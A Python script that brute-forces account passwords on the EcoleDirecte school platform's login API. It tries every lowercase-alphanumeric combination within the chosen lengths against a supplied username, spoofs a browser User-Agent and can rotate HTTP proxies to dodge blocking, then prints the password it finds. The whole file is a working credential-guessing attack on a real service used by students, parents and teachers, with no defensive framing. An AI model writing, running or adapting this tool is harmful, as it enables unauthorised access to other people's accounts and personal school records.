import json
import requests as req
from rich import print
import itertools

Proxies = input("Proxies (slower) Y/N : ")
while Proxies != "Y" and Proxies != "N":
  proxies = input("Proxies (slower) Y/N : ")
write = input("Write Tries (slower) Y/N : ")
while write != "Y" and write != "N":
  write = input("Write Tries (slower) Y/N : ")
while 1 == 1:
  try:
    min = int(input("minimum character : "))
    break
  except:
    pass
while 1 == 1:
  try:
    max = int(input("maximum character : "))
    break
  except:
    pass
username = input("Username : ")
if write == "N":
  print("Working...")
with open("http_proxies.txt", "r") as f:
  ip = f.read()
ip = ip.split("\n")


def login(username, min, max):
  found = False
  nb = 0
  for length in range(min, max):
    for combination in itertools.product(
        "abcdefghijklmnopqrstuvwxyz1234567890", repeat=length):
      word = ''.join(combination)
      login_url = "https://api.ecoledirecte.com/v3/login.awp"
      if Proxies == "Y":
        proxies = {
            "http": ip[nb],
        }
      headers = {
          "User-Agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
      }
      data = {
          "identifiant": username,
          "motdepasse": word,
          "acceptationCharte": True
      }
      payload = 'data=' + json.dumps(data)
      if Proxies == "Y":
        response = req.post(
          login_url,
          data=payload,
          headers=headers,
          proxies=proxies
          )
      else:
        response = req.post(login_url, data=payload, headers=headers)

      resp = response.json()
      if write == "Y":
        print(resp["code"], word)

      if resp["code"] == 200:
        found = True
        break
      if nb < len(ip) and Proxies == "Y":
        nb += 1
      else:
        nb = 0
    if found:
      break
  return word


password = login(username, min, max)
print("the password is : ", password)